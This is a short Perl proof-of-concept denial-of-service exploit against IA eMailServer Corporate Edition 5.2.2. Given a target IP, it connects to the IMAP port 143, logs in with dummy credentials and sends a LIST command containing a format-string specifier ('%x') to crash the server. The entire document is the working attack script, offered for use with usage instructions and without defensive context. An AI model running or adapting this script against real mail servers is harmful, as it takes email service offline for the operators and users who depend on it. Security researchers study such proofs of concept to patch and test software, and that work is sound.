#===== Start IAeMailServer_DOS.pl =====
#
# Usage: IAeMailServer_DOS.pl <ip>
#        IAeMailServer_DOS.pl 127.0.0.1
#
# True North Software, Inc. IA eMailServer Corporate Edition
# Version: 5.2.2. Build: 1051.
#
# Download:
# http://www.tnsoft.com/
#
#############################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "143",
                                    Proto    => "TCP"))
{
        print "Attempting to kill IA eMailServer at $ARGV[0]:143...";

        sleep(1);

        print $socket "0000 LOGIN hello moto\r\n";

        sleep(1);

        print $socket "0001 LIST 1 \%x\r\n";

        close($socket);
}
else
{
        print "Cannot connect to $ARGV[0]:143\n";
}
#===== End IAeMailServer_DOS.pl =====

